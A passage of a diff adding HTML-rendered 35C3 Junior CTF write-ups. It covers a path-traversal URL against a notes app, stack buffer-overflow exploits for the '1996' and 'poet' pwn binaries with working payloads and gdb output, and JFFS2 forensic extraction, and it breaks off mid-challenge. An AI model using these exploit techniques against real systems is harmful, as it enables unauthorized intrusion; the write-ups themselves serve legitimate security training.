+         &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;file_get_contents&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;./pws/&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;.pw&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'pw'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+             &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;file_get_contents&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$BACKEND&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;get/&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+         &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+             &lt;span class=&quot;k&quot;&gt;die&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;ERROR!&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+         &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+     &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+         &lt;span class=&quot;k&quot;&gt;die&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;ERROR!&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+     &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+ &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;The flag will be echoed if we manage to make a GET request to /admin:
+    &lt;div class=&quot;language-ruby highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'/admin'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt;
+     &lt;span class=&quot;no&quot;&gt;File&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;flag.txt&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h3 id=&quot;solution-4&quot;&gt;Solution&lt;/h3&gt;
+
+&lt;p&gt;Combining the &lt;strong&gt;LFI&lt;/strong&gt; with the &lt;strong&gt;get request to /admin&lt;/strong&gt; gives the following payload:&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;http://35.207.120.163/view.php?id=6578216296439429496/../../admin&amp;amp;pw=47bce5c74f589f4867dbd57e9ca9f808&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;The &lt;strong&gt;id&lt;/strong&gt; and &lt;strong&gt;pw&lt;/strong&gt; are the ones from a test note we’ve created before, they have to be valid in order for the exploit to work.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2018-12-30/note-accessible-flag.png&quot; alt=&quot;Note-accessible flag&quot; title=&quot;Note-accessible flag&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;junior-ctf-pwn---1996&quot;&gt;[Junior CTF] Pwn - 1996&lt;/h2&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;It’s 1996 all over again!&lt;/p&gt;
+
+  &lt;p&gt;nc 35.207.132.47 22227&lt;/p&gt;
+
+  &lt;p&gt;Difficulty estimate: very easy&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;First pwning challenge of this CTF! A very basic one to warm us up :wink:. We were given this &lt;a href=&quot;http://localhost:4000/assets/2018-12-30/1996.zip&quot; title=&quot;1996 zip&quot;&gt;zip&lt;/a&gt; containing the binary and its C++ source code.&lt;/p&gt;
+
+&lt;div class=&quot;language-c++ highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;// compile with -no-pie -fno-stack-protector
+&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;iostream&amp;gt;
+#include &amp;lt;unistd.h&amp;gt;
+#include &amp;lt;stdlib.h&amp;gt;
+&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;using&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;namespace&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;spawn_shell&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/bin/bash&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;execve&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/bin/bash&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+
+    &lt;span class=&quot;n&quot;&gt;cout&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Which environment variable do you want to read? &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;cin&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+    &lt;span class=&quot;n&quot;&gt;cout&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;=&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;getenv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;endl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Observations:&lt;/p&gt;
+&lt;ol&gt;
+  &lt;li&gt;The binary has been compiled without stack protector.&lt;/li&gt;
+  &lt;li&gt;The buffer overflow is pretty obvious here.&lt;/li&gt;
+  &lt;li&gt;a &lt;strong&gt;spawn_shell&lt;/strong&gt; function is given to help us.&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h3 id=&quot;solution-5&quot;&gt;Solution&lt;/h3&gt;
+
+&lt;p&gt;The objective here is to &lt;strong&gt;overwrite the return address of the main function with the address of the spawn_shell function&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;We have to &lt;strong&gt;determine the overflow offset&lt;/strong&gt;, either manually or with gdb, then, to &lt;strong&gt;get the address of the spawn shell function&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;Overflow offset:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;boiteaklou@kali:~/CTF/2018/35C3-Junior/Pwn/1996&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'print &quot;A&quot;*1048'&lt;/span&gt; |./1996
+Which environment variable &lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;you want to &lt;span class=&quot;nb&quot;&gt;read&lt;/span&gt;? AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+&lt;span class=&quot;nv&quot;&gt;AAAAAAAA&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Segmentation fault
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;spawn_shell address:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;objdump &lt;span class=&quot;nt&quot;&gt;-D&lt;/span&gt; ./1996 | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;spawn
+0000000000400897 &amp;lt;_Z11spawn_shellv&amp;gt;:
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Now, we can verify our payload on our local machine without forgetting to catch the standard input with &lt;code class=&quot;highlighter-rouge&quot;&gt;cat&lt;/code&gt; to avoid the shell to close itself immediately:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;boiteaklou@kali:~/CTF/2018/35C3-Junior/Pwn/1996&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;python &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'print &quot;A&quot;*1048+&quot;\x97\x08\x40\x00\x00\x00\x00\x00&quot;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; | ./1996
+Which environment variable &lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;you want to &lt;span class=&quot;nb&quot;&gt;read&lt;/span&gt;? AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;
+whoami
+boiteaklou
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Working! We can now retrieve the flag.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2018-12-30/1996-flag.png&quot; alt=&quot;1996 flag&quot; title=&quot;1996 flag&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;junior-ctf-pwn---poet&quot;&gt;[Junior CTF] Pwn - poet&lt;/h2&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;We are looking for the poet of the year:&lt;/p&gt;
+
+  &lt;p&gt;nc 35.207.132.47 22223&lt;/p&gt;
+
+  &lt;p&gt;Difficulty estimate: very easy&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;We were given this &lt;a href=&quot;http://localhost:4000/assets/2018-12-30/poet&quot; title=&quot;poet&quot;&gt;ELF 64 executable&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;A bit of &lt;strong&gt;reverse-engineering&lt;/strong&gt; was helpful to understand the functionalities of this program.&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;The program asks the user to write a poem.&lt;/li&gt;
+  &lt;li&gt;It asks a name for the author of the poem.&lt;/li&gt;
+  &lt;li&gt;Then, it computes a score to the poem.&lt;/li&gt;
+  &lt;li&gt;If we manage to &lt;strong&gt;score 1 000 000 points&lt;/strong&gt;, the flag is won.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Observations:&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;We can score 100 points for each word of the following list inside our poem: [“ESPR”, “eat”, “sleep”, “pwn”, “repeat”, “CTF”, “capture”, “flag”].&lt;/li&gt;
+  &lt;li&gt;The buffer allocated to the poem is too small for us to write “pwn” a thousand times.&lt;/li&gt;
+  &lt;li&gt;Author and Poem fields are &lt;strong&gt;vulnerable to buffer overflows&lt;/strong&gt;.&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2018-12-30/overflow-author.png&quot; alt=&quot;Poet author overflow&quot; title=&quot;Poet author overflow&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;solution-6&quot;&gt;Solution&lt;/h3&gt;
+
+&lt;p&gt;What we want is to &lt;strong&gt;overwrite the local variable storing the score of the poem&lt;/strong&gt;. This will be done by overflowing from the author buffer.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;strong&gt;NOTE:&lt;/strong&gt; First, I wanted to overflow from the poem buffer directly. I managed to overwrite the score but it caused a segmentation fault so I supposed I had to do it from the author buffer.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Once again, we need to determine the overflow offset and the value we want to write in place of the poem’s score.&lt;/p&gt;
+
+&lt;p&gt;The value is pretty easy to determine. We want a score of a million which gives in hex:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gdb-peda&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;p/x 1000000
+&lt;span class=&quot;nv&quot;&gt;$3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0xf4240
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The offset can be found using the following technique:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Prepare a very long pattern to detect when the overflow occurs.&lt;/li&gt;
+  &lt;li&gt;Set a breakpoint before the poem’s score is compared to 0xf4240.&lt;/li&gt;
+  &lt;li&gt;From our previous reverse-engineering, we know that the poem’s score is stored at &lt;strong&gt;RBX+0x440&lt;/strong&gt;.&lt;/li&gt;
+  &lt;li&gt;Examine the value at &lt;strong&gt;RBX+0x440&lt;/strong&gt; after having submitted the big pattern with gdb.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'print &quot;aaaa\nAAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFFGGGGGGGGHHHHHHHIIIIIIII&quot;'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; payload
+gdb-peda&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;r &amp;lt; payload
+gdb-peda&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;x/d &lt;span class=&quot;nv&quot;&gt;$rbx&lt;/span&gt;+0x440
+0x6024e0 &amp;lt;poem+1088&amp;gt;:   5280832617179597229
+gdb-peda&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;x/x &lt;span class=&quot;nv&quot;&gt;$rbx&lt;/span&gt;+0x440
+0x6024e0 &amp;lt;poem+1088&amp;gt;:   0x49494949494949ad    &lt;span class=&quot;c&quot;&gt;# Score of our poem&lt;/span&gt;
+gdb-peda&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;p/x &lt;span class=&quot;s2&quot;&gt;&quot;I&quot;&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$5&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;0x49, 0x0&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;We can see that the score is overwritten with “IIIIIII”.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;strong&gt;NOTE:&lt;/strong&gt; The \n is here to separate the poem and the author fields.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;From there, we have everything needed to build our payload and to retrieve the flag.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2018-12-30/poet-flag.png&quot; alt=&quot;Poet flag&quot; title=&quot;Poet flag&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;junior-ctf-forensic---rare_mount&quot;&gt;[Junior CTF] Forensic - rare_mount&lt;/h2&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Little or big, we do not care!&lt;/p&gt;
+
+  &lt;p&gt;FS&lt;/p&gt;
+
+  &lt;p&gt;Difficulty estimate: Easy&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;All credit goes to &lt;strong&gt;suchro&lt;/strong&gt; who solved all of the forensic challenges alone and is the original author of the following writeups. :thumbsup:&lt;/p&gt;
+
+&lt;p&gt;An &lt;a href=&quot;http://localhost:4000/assets/2018-12-30/rare_mount&quot; title=&quot;rare_mount&quot;&gt;unknown file&lt;/a&gt; was all that was given for this challenge.&lt;/p&gt;
+
+&lt;p&gt;Running &lt;code class=&quot;highlighter-rouge&quot;&gt;file&lt;/code&gt; on it was our first reflex but it didn’t gave much information:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;boiteaklou@kali:~/CTF/2018/35C3-Junior/For&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;file rare-fs.bin
+rare-fs.bin: data
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;binwalk&lt;/code&gt;, on the other hand, provided a way more intersting output:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;boiteaklou@kali:~/CTF/2018/35C3-Junior/For&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;binwalk rare-fs.bin
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+&lt;span class=&quot;nt&quot;&gt;--------------------------------------------------------------------------------&lt;/span&gt;
+0             0x0             JFFS2 filesystem, big endian
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;After some research, we found &lt;a href=&quot;&amp;quot;https://github.com/sviehb/jefferson&amp;quot;&quot;&gt;jefferson&lt;/a&gt; which is a &lt;strong&gt;JFFS2 filesystem extraction tool&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;boiteaklou@kali:~/CTF/2018/35C3-Junior/For/files&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;jefferson rare-fs.bin &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; rare_mount.out
+dumping fs &lt;span class=&quot;c&quot;&gt;#1 to /home/boiteaclou/CTF/2018/35C3-Junior/For/files/rare_mount.out/fs_1&lt;/span&gt;
+Jffs2_raw_dirent count: 2
+Jffs2_raw_inode count: 2155
+Jffs2_raw_summary count: 0
+Jffs2_raw_xattr count: 0
+Jffs2_raw_xref count: 0
+Endianness: Big
+writing S_ISREG RickRoll_D-oHg5SJYRHA0.mkv
+writing S_ISREG flag
+&lt;span class=&quot;nt&quot;&gt;----------&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The tool extracted a RickRoll video as long as the flag!&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;boiteaklou@kali:~/CTF/2018/35C3-Junior/For/files/rare_mount.out/fs_1&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;flag
+35C3_big_or_little_1_dont_give_a_shizzle
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;junior-ctf-forensic---epic_mount&quot;&gt;[Junior CTF] Forensic - epic_mount&lt;/h2&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;A little bit of stego. Not every header field looks like the other.&lt;/p&gt;
+
+  &lt;p&gt;FS&lt;/p&gt;
+
+  &lt;p&gt;Difficulty estimate: Easy-Medium&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;This second &lt;a href=&quot;http://localhost:4000/assets/2018-12-30/epic_mount&quot; title=&quot;epic_mount&quot;&gt;file&lt;/a&gt; was also in JFFS2 format.&lt;/p&gt;
+
+&lt;p&gt;Jefferson won’t do all the job this time! It returns the following error: &lt;code class=&quot;highlighter-rouge&quot;&gt;hdr_crc does not match!&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Digging into the code of jefferson, we found the part responsible of this error:&lt;/p&gt;
+
